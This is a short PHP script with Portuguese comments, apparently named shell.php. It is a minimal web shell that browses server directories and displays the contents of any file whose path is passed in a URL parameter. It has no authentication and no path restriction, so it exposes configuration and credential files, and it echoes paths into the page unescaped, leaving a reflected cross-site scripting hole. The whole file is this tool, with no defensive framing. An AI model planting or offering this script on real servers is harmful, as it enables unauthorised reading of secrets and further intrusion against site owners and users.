<?php

// Captura os parâmetros da URL: 'v' (diretório) e 'a' (arquivo a ser aberto)
$path = $_GET['v'] ?? null;
$action = $_GET['a'] ?? null;

// Mostra o cabeçalho simples
echo "Servidor<br><br>";

// Se foi passado um arquivo para abrir ('a'), entramos nesse bloco
if ($action) {
    // Cria uma área de texto para mostrar o conteúdo do arquivo
    echo "<textarea class='form-control' name='textl' rows='20' cols='100'>";

    // Tenta abrir o arquivo no modo leitura
    $arquivo_edit = @fopen($action, 'r');

    // Se não conseguir abrir, exibe mensagem de erro e encerra
    if (!$arquivo_edit) {
        die("Não foi possível abrir o arquivo: $action");
    }

    // Lê linha por linha do arquivo até o final
    while (!feof($arquivo_edit)) {
        $linha = fgets($arquivo_edit); // Lê uma linha
        echo htmlspecialchars($linha); // Exibe a linha escapando caracteres HTML
    }

    // Fecha o arquivo após a leitura
    fclose($arquivo_edit);
    echo "</textarea>";

// Caso contrário, se for diretório (ou não foi passado nada), executa esse bloco
} else {
    // Se não foi passado um diretório, usa o diretório atual
    if (!$path) {
        $path = "./";
    }

    // Tenta abrir o diretório informado
    $diretorio = @dir($path);

    // Se não conseguir abrir, exibe mensagem de erro e encerra
    if (!$diretorio) {
        die("Não foi possível abrir o diretório: $path");
    }

    // Obtém o caminho do diretório pai, para o botão de "Voltar"
    $path_pai = dirname(rtrim($path, '/'));

    // Exibe botão de voltar, exceto se estiver no diretório raiz
    if ($path !== "./") {
        echo "<a href='shell.php?v=$path_pai' style='display:inline-block; margin-bottom:15px;'>⬅️ Voltar</a><br><br>";
    }

    // Mostra o caminho atual
    echo "Listando arquivos em: <strong>$path</strong><br><br>";

    // Lê cada item dentro do diretório
    while ($arquivo = $diretorio->read()) {
        // Ignora os diretórios "." e ".."
        if ($arquivo === '.' || $arquivo === '..') continue;

        // Caminho completo do arquivo ou pasta
        $arquivo_completo = $path . $arquivo;

        // Pega a extensão do arquivo em letras minúsculas
        $extensao = strtolower(pathinfo($arquivo_completo, PATHINFO_EXTENSION));

        // Se for um arquivo de texto ou código, cria link para visualização
        if (in_array($extensao, ['php', 'js', 'css', 'txt'])) {
            echo "<a href='shell.php?a=$arquivo_completo'>$arquivo</a><br>";
        } 
        // Caso contrário, trata como diretório e cria link para navegar nele
        else {
            echo "<a href='shell.php?v=$arquivo_completo/'>$arquivo</a><br>";
        }
    }

    // Fecha o diretório após leitura
    $diretorio->close();
}
?>